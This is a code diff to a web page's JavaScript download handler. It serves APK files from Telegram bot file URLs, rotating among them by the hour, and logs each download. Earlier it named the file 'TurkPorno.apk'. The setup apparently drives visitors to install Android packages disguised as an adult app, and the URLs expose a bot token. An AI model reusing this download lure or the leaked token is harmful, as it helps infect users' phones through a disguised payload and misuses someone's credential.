@@ -4,10 +4,10 @@ document.addEventListener("DOMContentLoaded", () => {
   const btn = document.getElementById('download-button');
 
   const apkLinks = [
-"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_0.apk",
-"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_1.apk",
-"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_2.apk",
-"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_3.apk
+    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_0.apk",
+    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_1.apk",
+    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_2.apk",
+    "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_3.apk"
   ];
 
   btn.addEventListener('click', () => {
@@ -17,13 +17,8 @@ document.addEventListener("DOMContentLoaded", () => {
     const fileUrl = apkLinks[new Date().getHours() % apkLinks.length];
     sendLog(fileUrl);
 
-    // BU KISIM EN İYİSİ - DIRECT DOWNLOAD
-    const a = document.createElement('a');
-    a.href = fileUrl;
-    a.download = 'TurkPorno.apk'; // veya '' boş bırak
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
+    // window.open ile yeni sekmede aç
+    window.open(fileUrl, '_blank');
 
     setTimeout(() => {
       btn.innerText = 'Tekrar İndir';
@@ -31,8 +26,3 @@ document.addEventListener("DOMContentLoaded", () => {
     }, 3000);
   });
 });
-
-
-
-
-
